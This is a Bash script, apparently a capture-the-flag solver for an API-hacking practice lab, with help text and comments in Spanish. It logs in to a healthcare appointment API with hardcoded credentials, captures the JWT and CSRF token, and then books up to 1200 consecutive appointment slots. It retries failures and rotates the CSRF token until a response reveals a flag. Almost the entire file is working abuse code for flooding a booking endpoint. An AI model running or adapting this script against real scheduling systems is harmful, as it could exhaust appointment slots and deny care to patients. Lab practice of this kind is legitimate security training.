#!/bin/bash

URL_AUTH="https://hackapi.secops.group/api/v1/auth"
URL_APP="https://hackapi.secops.group/api/v2/appointment"
EMAIL="john4@healthcare.app"
PASS="john@1234"
BASE_SLOT="2024-12-15T10:00:00"
NOTES="Need consultation for fever"
COUNT=1200
MAX_RETRIES=3

usage() {
  cat <<EOF
Uso: $(basename "$0") [opciones]

Opciones:
  -e EMAIL       Email para login (default: john4@healthcare.app)
  -p PASSWORD    Password (default: john@1234)
  -n COUNT       Número de appointments (default: 1000)
  -m NOTES       Nota del appointment (default: "Need consultation for fever")
  -h             Muestra esta ayuda
EOF
  exit 0
}

while getopts "e:p:n:m:h" opt; do
  case $opt in
    e) EMAIL="$OPTARG" ;;
    p) PASS="$OPTARG" ;;
    n) COUNT="$OPTARG" ;;
    m) NOTES="$OPTARG" ;;
    h) usage ;;
    *) usage ;;
  esac
done

echo ">>> Logging in as $EMAIL ..."
login_resp=$(curl -s -i -k -X POST \
  -H "Content-Type: application/json" \
  -H "Accept: application/json" \
  -H "Authorization: {{apiKey}}" \
  -H "User-Agent: PostmanRuntime/7.54.0" \
  -H "Cache-Control: no-cache" \
  -H "Connection: keep-alive" \
  --data-binary "{\"email\":\"$EMAIL\",\"password\":\"$PASS\"}" \
  "$URL_AUTH")

jwt=$(echo "$login_resp" | grep -o '"token":"[^"]*"' | cut -d'"' -f4)
csrf=$(echo "$login_resp" | grep -i 'X-CSRF-Token:' | awk -F': ' '{print $2}' | tr -d '\r\n')

if [[ -z "$jwt" || -z "$csrf" ]]; then
  echo "FATAL: Login failed"
  exit 1
fi
echo "<<< Logged in. JWT=${jwt:0:20}... CSRF=$csrf"

ok=0
fail=0
for i in $(seq 0 $((COUNT - 1))); do
  # Compatibilidad con macOS: intentar gdate primero, luego date -j
  if command -v gdate &> /dev/null; then
    slot=$(gdate -d "2024-12-15 10:00:00 +${i} minutes" "+%Y-%m-%dT%H:%M:%S" 2>/dev/null)
  else
    slot=$(date -j -f "%Y-%m-%d %H:%M:%S" -v+${i}M "2024-12-15 10:00:00" "+%Y-%m-%dT%H:%M:%S" 2>/dev/null)
  fi
  if [[ -z "$slot" ]]; then
    h=$((i / 60))
    m=$((i % 60))
    slot="${BASE_SLOT}+$(printf '%02d' $h):$(printf '%02d' $m)"
  fi

  retry=0
  while true; do
    resp=$(curl -s -i -k -X POST \
      -H "X-CSRF-Token: $csrf" \
      -H "Content-Type: application/json" \
      -H "Accept: application/json" \
      -H "Authorization: $jwt" \
      -H "User-Agent: PostmanRuntime/7.54.0" \
      -H "Cache-Control: no-cache" \
      -H "Connection: keep-alive" \
      --data-binary "{\"slot\":\"$slot\",\"notes\":\"$NOTES\"}" \
      "$URL_APP")

    http_code=$(echo "$resp" | head -1 | awk '{print $2}')

    # Buscar flag en la respuesta
    flag=$(echo "$resp" | grep -i 'flag')
    if [[ -n "$flag" ]]; then
      echo "🚩 FLAG FOUND:"
      echo "=== FULL RESPONSE ==="
      echo "$resp"
      echo "===================="
      exit 0
    fi

    if [[ "$http_code" == "201" ]]; then
      new_csrf=$(echo "$resp" | grep -i 'X-CSRF-Token:' | awk -F': ' '{print $2}' | tr -d '\r\n')
      if [[ -n "$new_csrf" ]]; then
        csrf="$new_csrf"
      fi
      echo "[OK] #$i slot=$slot new-csrf=$csrf"
      echo "--- Response body ---"
      echo "$resp" | tail -1
      echo "---------------------"
      ((ok++))
      break
    else
      echo "[RESPONSE #$i]"
      echo "$resp"
      echo ""
      ((retry++))
      if (( retry >= MAX_RETRIES )); then
        echo "[FAIL] #$i slot=$slot (HTTP $http_code, retries exhausted)"
        ((fail++))
        break
      fi
      sleep 1
      echo "[RETRY] #$i attempt $retry"
    fi
  done
done

echo
echo "=== DONE: $ok ok, $fail fail ==="
